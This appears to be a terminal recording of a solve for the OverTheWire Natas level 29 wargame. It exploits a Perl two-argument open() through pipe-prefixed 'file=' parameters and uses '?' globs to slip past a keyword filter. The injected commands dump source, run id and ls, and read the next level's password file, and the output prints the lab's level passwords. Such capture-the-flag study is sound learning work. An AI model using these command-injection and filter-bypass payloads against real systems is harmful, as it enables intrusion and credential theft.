{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793521881,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L29.sh","title":"Natas L29 -> natas30: Perl two-arg open pipe + glob bypass of the /natas/ filter","env":{"SHELL":"/bin/bash"}}
[0.002, "o", "$ curl -s -u natas29:<pw> http://natas29.natas.labs.overthewire.org/\r\n$   the page lists .txt files; \"View sourcecode\" says: c4n Y0 h4z s4uc3?\r\n$   so we recover the Perl source through the bug itself:\r\n$ curl -s -u natas29:<pw> --get --data-urlencode 'file=|cat /var/www/n?tas/n?tas29/index.pl;' http://natas29.natas.labs.overthewire.org/index.pl\r\n"]
[1.219, "o", "#!/usr/bin/perl\r\nuse CGI qw(:standard);\r\n\r\nprint <<END;\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\r\n<head>\r\n<!-- This stuff in the header has nothing to do with the level -->\r\n<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\r\n<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\r\n<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\r\n<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\r\n<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\r\n<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\r\n<script>var wechallinfo = { \"level\": \"natas29\", \"pass\": \"hwgoYUiGWoSZAqphtCAZf7u1jS16KEah\" };</script></head>\r\n<body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\">\r\n\r\n<style>\r\n\r\n$   the code is:\r\n$     if(param(\"file\")){ $f=param(\"file\");\r\n$       if($f=~/natas/){ print \"meeeeeep!\"; }\r\n$       else{ open(FD, \"$f.txt\"); while(<FD>){ print escapeHTML($_); } } }\r\n$   two-argument open(): if $f begins with \"|\", Perl opens a PIPE and runs the\r\n$   rest as a shell command. The \".txt\" suffix is appended, so it becomes a\r\n$   second command that fails harmlessly. The command inherits the CGI stdout,\r\n$   so its output lands in the HTTP response.\r\n$ the filter only blocks the literal string \"natas\"; a glob bypasses it:\r\n$ curl -s -u natas29:<pw> --get --data-urlencode 'file=|id;' http://natas29.natas.labs.overthewire.org/index.pl\r\n"]
[0.631, "o", "</html>\r\nuid=30029(natas29) gid=30029(natas29) groups=30029(natas29)\r\n$ curl -s -u natas29:<pw> --get --data-urlencode 'file=|ls;' http://natas29.natas.labs.overthewire.org/index.pl\r\n"]
[0.628, "o", "</html>\r\nindex.pl\r\nperl underground 2.txt\r\nperl underground 3.txt\r\nperl underground 4.txt\r\nperl underground 5.txt\r\n$ curl -s -u natas29:<pw> --get --data-urlencode 'file=|ls /etc/n?tas_webpass;' http://natas29.natas.labs.overthewire.org/index.pl\r\n"]
[1.271, "o", "</html>\r\nnatas0\r\nnatas1\r\nnatas10\r\nnatas11\r\nnatas12\r\n$ read the next password through the glob (n?tas matches natas without the word):\r\n$ curl -s -u natas29:<pw> --get --data-urlencode 'file=|cat /etc/n?tas_webpass/n?tas30;' http://natas29.natas.labs.overthewire.org/index.pl\r\n"]
[1.561, "o", "</html>\r\nfrO4U4zCfVJXq2zG5HSVNjA46nQGzoqF\r\n$ verify: curl -u natas30:<pw> http://natas30.natas.labs.overthewire.org/ -> 200\r\n"]
